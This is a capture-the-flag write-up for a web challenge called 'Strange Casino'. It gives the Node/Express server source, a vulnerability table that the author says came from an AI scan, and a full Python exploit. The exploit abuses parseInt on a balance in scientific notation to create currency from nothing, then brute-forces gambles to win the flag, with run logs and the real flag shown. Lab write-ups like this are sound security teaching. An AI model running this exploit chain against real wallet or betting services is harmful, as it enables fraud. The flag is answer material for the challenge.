# Strange Casino

## Description

[Target](https://casino.dgactf.com/)

[server.js](https://dgactf.com/files/6156b1046f3ded4c1bf04bd8d094beab/server.js?token=eyJ1c2VyX2lkIjoyMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MX0.aYmVIg.BU6l-Z6jdRE6JdAfH0z9XKvIFeA)

```js
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/audio', express.static(path.join(__dirname, 'static')));

app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

app.use((req, res, next) => {
    if (!req.session.wallet) { req.session.wallet = { moneta: 10e-6, gela: 0 }; }
    next();
});

function secureRandom() { return crypto.randomInt(0, 100000000) / 100000000; }

app.get('/api/balance', (req, res) => {
    const wallet = req.session.wallet;
    res.json({
        moneta: wallet.moneta,
        mikro_moneta: wallet.moneta * 1e6,
        gela: wallet.gela
    });
});

app.post('/api/gamble', (req, res) => {
    const { moneta_type, raodenoba } = req.body;

    if (!['moneta', 'gela'].includes(moneta_type)) { return res.status(400).json({ error: 'დაფიქსირდა შეცდომა' }); }

    let amount = parseFloat(raodenoba);
    if (isNaN(amount) || amount <= 0) { return res.status(400).json({ error: 'დაფიქსირდა შეცდომა' }); }

    const wallet = req.session.wallet;
    if (moneta_type === 'moneta' && amount > wallet.moneta) { return res.status(400).json({ error: 'არასაკმარისი მონეტა' }); }
    if (moneta_type === 'gela' && amount > wallet.gela) { return res.status(400).json({ error: 'არასაკმარისი გელა' }); }

    wallet[moneta_type] -= amount;

    const win = secureRandom() < 0.09;
    let winnings = 0;
    if (win) {
        winnings = amount * 10;
        wallet[moneta_type] += winnings;
    }

    res.json({
        win: win, 
        new_balance: wallet[moneta_type],
        winnings: winnings 
    });
});

app.post('/api/convert', (req, res) => {
    let { raodenoba } = req.body;

    const wallet = req.session.wallet;
    const coinBalance = parseInt(wallet.moneta);
    raodenoba = parseInt(raodenoba);

    if (isNaN(raodenoba) || raodenoba <= 0) { return res.status(400).json({ error: 'დაფიქსირდა შეცდომა' }); }

    if (raodenoba <= coinBalance) {
        wallet.moneta -= raodenoba;
        wallet.gela += raodenoba * 0.01;
        return res.json({ success: true, message: `გადაიცვალა ${raodenoba} მონეტა ₾${(raodenoba * 0.01).toFixed(2)}-ად` });
    } else {
        return res.status(400).json({ error: 'გადაცვლა ვერ შესრულდა' });
    }
});

app.post('/api/flag', (req, res) => {
    if (req.session.wallet.gela >= 10) {
        req.session.wallet.gela -= 10;
        res.json({ flag: process.env.FLAG || 'DGA{fake_flag}' });
    } else {
        res.status(400).json({ error: 'არ გაქვთ საკმარისი გელა. საჭიროა ₾10.' });
    }
});

app.post('/api/deposit', (req, res) => { res.status(503).json({ error: 'დროებით არ მუშაობს' }); });
app.post('/api/withdraw', (req, res) => { res.status(503).json({ error: 'დროებით არ მუშაობს' }); });
app.listen(PORT, () => { console.log(`სერვერი გაშვებულია: http://0.0.0.0:${PORT}`); });
```

## Solution

Just yesterday I came across [this model in Twitter](https://x.com/i/status/2020523903878406426) and perfect way to test it, using `claude-4-sonnet` worked best.
- [https://huggingface.co/UCSB-SURFI/VulnLLM-R-7B](https://huggingface.co/UCSB-SURFI/VulnLLM-R-7B)
- [https://huggingface.co/spaces/UCSB-SURFI/VulnLLM-R](https://huggingface.co/spaces/UCSB-SURFI/VulnLLM-R)

Vulnerability report via AI

| Severity | Vulnerability                                                           | Line(s)         |
| -------- | ----------------------------------------------------------------------- | --------------- |
| Critical | parseInt coercion on scientific-notation floats enables value inflation | 84              |
| High     | No rate limiting enables brute-force automation                         | All endpoints   |
| Medium   | Session misconfiguration (saveUninitialized, no secure/sameSite)        | 14-19           |
| Medium   | No CSRF protection                                                      | All POST routes |
| Medium   | Ephemeral session secret                                                | 15              |
| Low      | MemoryStore in production                                               | 14              |
| Low      | Flag format disclosure                                                  | 106             |
| Low      | Binds to 0.0.0.0                                                        | 120             |
| Info     | Missing security headers                                                | —               |
**Location**: Lines 84-85 (/api/convert)
**Bug**: `parseInt()` is used on `wallet.moneta`, which is a floating-point number. When JavaScript represents very small floats (<1e-6) in scientific notation, `parseInt` misparses them:

| wallet.moneta | String(...) | parseInt(...) |
| ------------- | ----------- | ------------- |
| 0.00001       | "0.00001"   | 0             |
| 0.000001      | "0.000001"  | 0             |
| 9e-7          | "9e-7"      | 9             |
| 5e-7          | "5e-7"      | 5             |
| 1e-7          | "1e-7"      | 1             |
`parseInt` reads the string character-by-character and stops at **e**, so "**9e-7**" is parsed as the integer **9**. This means a user with 0.0000009 moneta (coin) is treated as having 9 moneta (coin) for the conversion check.

Exploit chain (flag retrieval):

1. Gamble to reach scientific notation range: Starting at `moneta` = 0.00001, bet 0.0000091 on `moneta` and lose. Balance becomes `0.00001 - 0.0000091 = 9e-7`. (Probability of loss: 91%, highly likely.)
2. Exploit `parseInt` to create value: Call `/api/convert` with `raodenoba` (amount): 9. The server computes `coinBalance = parseInt(9e-7) = 9`, passes the check `9 <= 9`, and executes `wallet.gela += 9 * 0.01 = 0.09`. You now have 0.09 gela from essentially nothing.
3. Gamble gela up to 10: Repeatedly gamble the full gela balance (10x payout, 9% win rate). Three consecutive wins: 0.09 → 0.9 → 9 → 90. If any bet loses, start over with a new session. Probability per attempt: `0.09^3 ≈ 0.073%`, so ~1,370 attempts on average.
4. Claim flag: Call `/api/flag` with `gela >= 10`.

Setup local debug
```bash
PS casino> npm init
PS casino> npm install express express-session
PS casino> node .\server.js
```

```python
import requests
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def attempt():
    session = requests.Session()

    # Step 1: Lose a precise gamble to push moneta (coins) into scientific notation range
    # Starting moneta (coins): 10e-6 = 0.00001
    # Bet 0.0000091 and lose → balance = 0.00001 - 0.0000091 = 9e-7
    # parseInt("9e-7") = 9 on the server side
    bet_amount = 0.0000091

    while True:
        resp = session.post(f"{BASE}/api/gamble", json={"moneta_type": "moneta", "raodenoba": bet_amount}).json()
        if not resp.get("win"):
            # Lost — balance should now be ~9e-7
            break
        # Won unexpectedly — balance is now larger; recalculate bet to land at 9e-7 again
        new_bal = resp["new_balance"]
        bet_amount = new_bal - 9e-7

    # Step 2: Exploit parseInt coercion — convert 9 "moneta" into 0.09 gela
    resp = session.post(f"{BASE}/api/convert", json={"raodenoba": 9}).json()
    if not resp.get("success"):
        return None  # shouldn't happen

    # Step 3: Gamble gela upward — need 3 consecutive 10x wins (0.09 → 0.9 → 9 → 90)
    for _ in range(3):
        resp = session.get(f"{BASE}/api/balance").json()
        gela = resp["gela"]
        if gela >= 10:
            break
        resp = session.post(f"{BASE}/api/gamble", json={"moneta_type": "gela", "raodenoba": gela}).json()
        if not resp.get("win"):
            return None  # lost, retry from scratch

    # Step 4: Claim the flag
    resp = session.post(f"{BASE}/api/flag").json()
    return resp.get("flag")

attempt_num = 0
while True:
    attempt_num += 1
    flag = attempt()
    if flag:
        print(f"[+] Flag captured on attempt {attempt_num}: {flag}")
        break
    if attempt_num % 100 == 0:
        print(f"[*] {attempt_num} attempts so far...")
```

The hard part of this challenge is luck 😀 You may get flag at attempt 1, 49, 200, 563 or 2304
```bash
[*] 100 attempts so far...
[*] 200 attempts so far...
[*] 300 attempts so far...
[*] 400 attempts so far...
[*] 500 attempts so far...
[+] Flag captured on attempt 563: DGA{fake_flag}
```

Exploit will take it's sweet time on remote server :(

```bash
# Start 1
[*] 2200 attempts so far...
[*] 2300 attempts so far...
# Stopped to double check POC was working
# Started second time
[*] 100 attempts so far...
[*] 200 attempts so far...
[*] 300 attempts so far...
[*] 400 attempts so far...
[*] 500 attempts so far...
[*] 600 attempts so far...
[*] 700 attempts so far...
[*] 800 attempts so far...
[*] 900 attempts so far...
[+] Flag captured on attempt 915: DGA{PR0B4B1L1TY_15_N0TH1NG_IF_U_C4N_H4CK}
```

This took way too long.... like 40-50min maybe

::: tip Flag
`DGA{PR0B4B1L1TY_15_N0TH1NG_IF_U_C4N_H4CK}`
:::

